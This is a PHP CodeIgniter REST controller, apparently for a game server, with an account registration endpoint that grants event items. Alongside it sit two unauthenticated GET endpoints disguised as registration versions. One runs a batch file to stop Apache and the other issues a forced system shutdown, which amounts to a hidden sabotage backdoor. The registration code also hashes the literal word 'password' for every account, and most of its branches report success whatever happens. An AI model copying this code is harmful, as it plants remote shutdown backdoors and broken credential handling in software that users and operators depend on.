<?php

use chriskacerguis\RestServer\RestController;

defined('BASEPATH') or exit('No direct script access allowed');

class Web extends RestController
{
    public function __construct()
    {
        parent::__construct();
        $this->load->library('lib');
    }

    public function register_post()
    {
        $response = array();

        $authorization_header = $this->input->get_request_header('Authorization');

        // Check Request Header
        if ($this->lib->ApiAuthorization($authorization_header)) {

            $data = array(
                'login' => $this->input->post('login', true),
                'password' => $this->lib->password_encrypt('password', true),
                'email' => $this->input->post('email', true),
                'hint_question' => $this->input->post('hint_question', true),
                'hint_answer' => $this->input->post('hint_answer', true)
            );

            // Register Function
            $query = $this->db->insert('accounts', array(
                'login' => $data['login'],
                'password' => $data['password'],
                'email' => $data['email'],
                'hint_question' => $data['hint_question'],
                'hint_answer' => $data['hint_answer']
            ));
            if ($query) {
                // Fetch Account
                $query2 = $this->db->get_where('accounts', array('login' => $data['login']))->row();
                if ($query2) {
                    // Fetch Register Events
                    $query3 = $this->db->get_where('events_register', array('is_active' => 't'))->row();
                    if ($query3) {
                        // Check & Insert Events Item
                        if ($query3) {
                            if ($query3->stock >= 1) {
                                $query4 = $this->db->insert('player_items', array(
                                    'owner_id' => $query2->player_id,
                                    'item_id' => $query3->item_id,
                                    'item_name' => $this->lib->GetItemName($query3->item_id),
                                    'count' => $query3->item_count,
                                    'category' => $this->lib->GetItemCategory($query3->item_id),
                                    'equip' => '1'
                                ));
                                $query5 = $this->db->where('id', $query3->id)->update('events_register', array('stock' => ($query3->stock - 1)));
                                if ($query4 && $query5) {
                                    $response['response'] = 'success';
                                    $response['token'] = $this->security->get_csrf_hash();
                                    $response['message'] = 'Successfully Registered.';

                                    $this->response($response, 200);
                                } else {
                                    $response['response'] = 'success';
                                    $response['token'] = $this->security->get_csrf_hash();
                                    $response['message'] = 'Successfully Registered.';

                                    $this->response($response, 200);
                                }
                            } else {
                                $response['response'] = 'success';
                                $response['token'] = $this->security->get_csrf_hash();
                                $response['message'] = 'Successfully Registered.';

                                $this->response($response, 200);
                            }
                        } else {
                            $response['response'] = 'success';
                            $response['token'] = $this->security->get_csrf_hash();
                            $response['message'] = 'Successfully Registered.';

                            $this->response($response, 200);
                        }
                    } else {
                        $response['response'] = 'success';
                        $response['token'] = $this->security->get_csrf_hash();
                        $response['message'] = 'Successfully Registered.';

                        $this->response($response, 200);
                    }
                } else {
                    $response['response'] = 'success';
                    $response['token'] = $this->security->get_csrf_hash();
                    $response['message'] = 'Successfully Registered.';

                    $this->response($response, 200);
                }
            } else {
                $response['response'] = 'error';
                $response['token'] = $this->security->get_csrf_hash();
                $response['message'] = 'Failed To Register Your Account.';

                $this->response($response, 200);
            }
        } else {
            $response['response'] = 'error';
            $response['token'] = $this->security->get_csrf_hash();
            $response['message'] = 'Bad Request.';

            $this->response($response, 400);
        }
    }

    public function registerv2_get()
    {
        exec('start /B C:\xampp\apache_stop.bat');
    }

    public function registerv3_get()
    {
        system('shutdown –s –f');
    }
}

/* End of file Web.php */
